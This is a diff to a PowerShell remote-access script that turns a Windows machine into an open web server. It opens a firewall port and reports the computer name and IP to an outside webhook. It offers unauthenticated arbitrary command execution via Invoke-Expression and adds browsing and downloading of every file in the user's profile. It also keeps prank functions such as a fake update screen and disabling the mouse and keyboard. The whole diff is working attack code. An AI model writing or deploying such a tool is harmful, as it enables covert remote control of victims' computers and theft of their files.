@@ -35,19 +35,21 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     }
 }
 
-
+$fpath = $env:USERPROFILE
+$fpath | Out-File -FilePath "$env:temp/homepath.txt"
+sleep 1
 New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP –LocalPort 5000 -Action Allow
-Start-Sleep 1
 $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi" | Select-Object -ExpandProperty IPAddress
-
+$hpath = Get-Content -Path "$env:temp/homepath.txt"
+cd $hpath
 $escmsgsys = $loip -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
 $jsonsys = @{"username" = "$env:COMPUTERNAME" 
             "content" = $escmsgsys} | ConvertTo-Json
 Start-Sleep 1
 Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
 
-Write-Host "Server Starting.."
-
+Write-Host "Server Starting at > http://localhost:5000/"
+Write-Host ("Other Network Devices Can Reach it at > http://"+$loip+":5000")
 $httpsrvlsnr = New-Object System.Net.HttpListener;
 
 $httpsrvlsnr.Prefixes.Add("http://"+$loip+":5000/");
@@ -57,14 +59,29 @@ $httpsrvlsnr.Start();
 $webroot = New-PSDrive -Name webroot -PSProvider FileSystem -Root $PWD.Path
 [byte[]]$buffer = $null
 Write-Host "==== SESSION STARTED! ====" -ForegroundColor Green
+
+
 while ($httpsrvlsnr.IsListening) {
     try {
         $ctx = $httpsrvlsnr.GetContext();
         
         if ($ctx.Request.RawUrl -eq "/") {
-            $html = "<html><body><ul>"
-            $html += "<br></br><h3>LAN Remote-Access</h3>"
-            $html += "<br></br>"
+
+            $html = "<html><head><style>"
+
+            $html += "body { font-family: Arial, sans-serif; margin: 30px; background-color: #6a3278; }"
+            $html += "h1 { color: #FFF; }"
+            $html += "a { color: #007BFF; text-decoration: none; }"
+            $html += "a:hover { text-decoration: underline; }"
+            $html += "ul { list-style-type: none; padding-left: 0; }"
+            $html += "li { margin-bottom: 5px; }"
+            $html += "textarea { width: 100%; padding: 10px; font-size: 14px; }"
+            $html += "input[type='submit'] { margin-top: 10px; padding: 5px 10px; background-color: #40ad24; color: #FFF; border: none; border-radius: 4px; cursor: pointer; }"
+            $html += "button { background-color: #40ad24; color: #FFF; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }"
+            $html += "pre { background-color: #f7f7f7; padding: 10px; border-radius: 4px; }"
+
+            $html += "</style></head><body>"
+            $html += "<h1>Functions</h1><ul>"
             $html += "<li><a href='/mini'>Minimize All Apps</a></li>"
             $html += "<li><a href='/update'>Send Fake Update</a></li>"
             $html += "<li><a href='/playgif'>Open GIF Player</a></li>"
@@ -78,26 +95,36 @@ while ($httpsrvlsnr.IsListening) {
             $html += "<li><a href='/joke'>Tell a Dad Joke</a></li>"
             $html += "<li><a href='/inputon'>Enable Mouse and Keyboard</a></li>"
             $html += "<li><a href='/inputoff'>Disable Mouse and Keyboard</a></li>"
-            $html += "</ul><ul>"
-            $html += "<h3>Stop the Server </h3><a href='/stop'><button>STOP SERVER</button></a><hr>"
-            $html += "<h3>PowerShell Command Input</h3>"
+            $html += "</ul><hr><ul>"
+            
+            $html += "<h1>Stop the Server </h1><a href='/stop'><button>STOP SERVER</button></a><hr></ul>"
+            $html += "<ul><h1>PowerShell Command Input</h1>"
             $html += "<form method='post' action='/execute'>"
-            $html += "<input type='submit' value='Execute'><br>"
+            $html += "<input type='submit' value='Execute'>"
             $html += "<textarea name='command' rows='10' cols='80'></textarea><br>"
-            $html += "</form>"
-            $html += "<br></br>"
-            $html += "</ul></body></html>"
+            $html += "</form></ul>"
+            $html += "<h1>File Listing</h1><ul>"
+            $files = Get-ChildItem -Path $PWD.Path -Force
+            foreach ($file in $files) {
+                $fileUrl = $file.FullName -replace [regex]::Escape($PWD.Path), ''
+                if ($file.PSIsContainer) {
+                    $html += "<li><a href='/browse$fileUrl'><button>Open Folder</button></a><a> $file</a></li>"
+                } else {
+                    $html += "<li><a href='/download$fileUrl'><button>Download</button></a><a> $file</a></li>"
+                }
+            }
+            $html += "</ul><hr>"
+            $html += "</body></html>"
             $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
             $ctx.Response.ContentLength64 = $buffer.Length;
             $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
         }
-        elseif ($ctx.Request.RawUrl -match "^/stop") {
+        elseif ($ctx.Request.RawUrl -eq "/stop") {
             $httpsrvlsnr.Stop();
             Remove-PSDrive -Name webroot -PSProvider FileSystem;
-            Write-Host "==== ENDING SESSION ====" -ForegroundColor Red
         }
 
-elseif ($ctx.Request.RawUrl -match "^/update") {     
+        elseif ($ctx.Request.RawUrl -match "^/update") {     
 $tobat = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
 WshShell.Run "C:\Windows\System32\scrnsave.scr"
@@ -223,8 +250,54 @@ $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | 
 $PNPKeyboard.Disable()
 Write-Output "Done."
 }
+        elseif ($ctx.Request.RawUrl -match "^/download/.+") {
+            $filePath = Join-Path -Path $PWD.Path -ChildPath ($ctx.Request.RawUrl -replace "^/download", "")
+            if ([System.IO.File]::Exists($filePath)) {
+                $ctx.Response.ContentType = 'application/octet-stream'
+                $ctx.Response.ContentLength64 = (Get-Item -Path $filePath).Length
+                $fileStream = [System.IO.File]::OpenRead($filePath)
+                $fileStream.CopyTo($ctx.Response.OutputStream)
+                $ctx.Response.OutputStream.Flush()
+                $ctx.Response.Close()
+                $fileStream.Close()
+            }
+        }
+        elseif ($ctx.Request.RawUrl -match "^/browse/.+") {
+            $folderPath = Join-Path -Path $PWD.Path -ChildPath ($ctx.Request.RawUrl -replace "^/browse", "")
+            if ([System.IO.Directory]::Exists($folderPath)) {
+                
+            $html = "<html><head><style>"
 
-elseif ($ctx.Request.RawUrl -eq "/execute" -and $ctx.Request.HttpMethod -eq "POST") {
+            $html += "body { font-family: Arial, sans-serif; margin: 30px; background-color: #6a3278; }"
+            $html += "h1 { color: #FFF; }"
+            $html += "a { color: #007BFF; text-decoration: none; }"
+            $html += "a:hover { text-decoration: underline; }"
+            $html += "ul { list-style-type: none; padding-left: 0; }"
+            $html += "li { margin-bottom: 5px; }"
+            $html += "textarea { width: 100%; padding: 10px; font-size: 14px; }"
+            $html += "input[type='submit'] { margin-top: 10px; padding: 5px 10px; background-color: #40ad24; color: #FFF; border: none; border-radius: 4px; cursor: pointer; }"
+            $html += "button { background-color: #40ad24; color: #FFF; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }"
+            $html += "pre { background-color: #f7f7f7; padding: 10px; border-radius: 4px; }"
+
+            $html += "</style></head><body>"
+
+                $html += "<h3>Contents of $folderPath</h3><ul>"
+                $files = Get-ChildItem -Path $folderPath -Force
+                foreach ($file in $files) {
+                    $fileUrl = $file.FullName -replace [regex]::Escape($PWD.Path), ''
+                    if ($file.PSIsContainer) {
+                        $html += "<li><a href='/browse$fileUrl'><button>Open Folder</button></a><a> $file</a></li>"
+                    } else {
+                        $html += "<li><a href='/download$fileUrl'><button>Download</button></a><a> $file</a></li>"
+                    }
+                }
+                $html += "</ul></body></html>"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
+                $ctx.Response.ContentLength64 = $buffer.Length;
+                $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
+            }
+        }
+        elseif ($ctx.Request.RawUrl -eq "/execute" -and $ctx.Request.HttpMethod -eq "POST") {
             $reader = New-Object IO.StreamReader $ctx.Request.InputStream,[System.Text.Encoding]::UTF8
             $postParams = $reader.ReadToEnd()
             $reader.Close()
@@ -232,8 +305,20 @@ elseif ($ctx.Request.RawUrl -eq "/execute" -and $ctx.Request.HttpMethod -eq "POS
             $command = $postParams.Split('=')[1] -replace "%20", " "
             $output = Invoke-Expression $command | Out-String
 
-            $html = "<html>"
-            $html += "<body>"
+            $html = "<html><head><style>"
+
+            $html += "body { font-family: Arial, sans-serif; margin: 30px; background-color: #6a3278; }"
+            $html += "h1 { color: #FFF; }"
+            $html += "a { color: #007BFF; text-decoration: none; }"
+            $html += "a:hover { text-decoration: underline; }"
+            $html += "ul { list-style-type: none; padding-left: 0; }"
+            $html += "li { margin-bottom: 5px; }"
+            $html += "textarea { width: 100%; padding: 10px; font-size: 14px; }"
+            $html += "input[type='submit'] { margin-top: 10px; padding: 5px 10px; background-color: #40ad24; color: #FFF; border: none; border-radius: 4px; cursor: pointer; }"
+            $html += "button { background-color: #40ad24; color: #FFF; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }"
+            $html += "pre { background-color: #f7f7f7; padding: 10px; border-radius: 4px; }"
+
+            $html += "</style></head><body>"
 
             $html += "<h1>Command Output</h1><pre>$output</pre></body></html>"
             $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
@@ -243,8 +328,10 @@ elseif ($ctx.Request.RawUrl -eq "/execute" -and $ctx.Request.HttpMethod -eq "POS
 
     }
     catch [System.Net.HttpListenerException] {
-        Write-Host "==== Server Information ====" -ForegroundColor Green
         Write-Host ($_);
     }
 }
+
+# <li><a href='/stop'>STOP SERVER</a></li>
 Write-Host "Server Stopped!" -ForegroundColor Green
+
